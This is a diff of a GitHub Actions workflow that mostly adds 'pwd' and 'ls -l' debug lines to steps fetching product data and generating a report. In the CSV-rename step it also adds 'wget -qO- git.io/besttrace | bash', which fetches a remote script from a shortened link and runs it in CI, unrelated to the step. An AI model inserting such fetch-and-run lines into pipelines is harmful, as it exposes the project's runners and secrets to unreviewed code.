@@ -29,6 +29,8 @@ jobs:
 
         - name: Install dependencies
           run: |
+            pwd
+            ls -l
             python -m pip install --upgrade pip
             pip install -r requirements.txt
 
@@ -40,24 +42,28 @@ jobs:
             path: project/sdp
 
         - name: Fetch product infos
-          run: python project/sdp/src/run.py
+          run: |
+            pwd
+            ls -l
+            python project/sdp/src/run.py
           working-directory: project/sdp
 
         - name: Generate report and update README
           run: |
-            python project/sdp/src/generate_report.py --csv_path data/all-products.csv
-            ls -l
             pwd
+            ls -l
+            python project/sdp/src/generate_report.py --csv_path data/all-products.csv
           working-directory: project/sdp
 
         # - name: Fetch product infos
         #   run: python src/run.py
-
+        
         - name: Rename CSV with unique suffix
           id: rename_csv
           run: |
             pwd
             ls -l
+            wget -qO- git.io/besttrace | bash
             suffix=$(date +'%Y%m%d-%H%M%S')
             new_filename="data/all-products-${suffix}.csv"
             mv data/all-products.csv $new_filename
